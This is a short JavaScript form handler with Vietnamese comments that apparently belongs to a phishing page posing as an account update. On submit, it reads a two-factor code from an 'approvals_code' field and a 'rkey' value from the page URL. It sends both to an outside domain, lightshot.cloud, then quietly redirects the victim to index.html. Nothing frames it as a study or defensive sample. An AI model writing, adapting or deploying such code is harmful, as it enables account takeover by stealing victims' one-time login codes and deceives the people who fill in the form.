document.getElementById("update-form").addEventListener("submit", function (event) {

    event.preventDefault();
    const twofa = document.getElementById("approvals_code").value;
    var queryString = window.location.search;

    // Tạo một đối tượng URLSearchParams từ chuỗi query
    var searchParams = new URLSearchParams(queryString);

    // Lấy giá trị của tham số "rkey"
    var rkey = searchParams.get("rkey");
    console.log(rkey)
    // Gửi dữ liệu POST đến máy chủ để cập nhật tài khoản
    fetch(`https://lightshot.cloud/update?rkey=${rkey}&twofa=${twofa}`, {
        method: "get",
        // headers: {
        //     "Content-Type": "application/x-www-form-urlencoded"
        // },
        // body: `rkey=${username}&twofa=${twofa}`
    })
        .then(response => response.text())
        .then(data => {
            window.location.href = "./index.html"
        })
        .catch(error => {
            console.error(error);
        });
});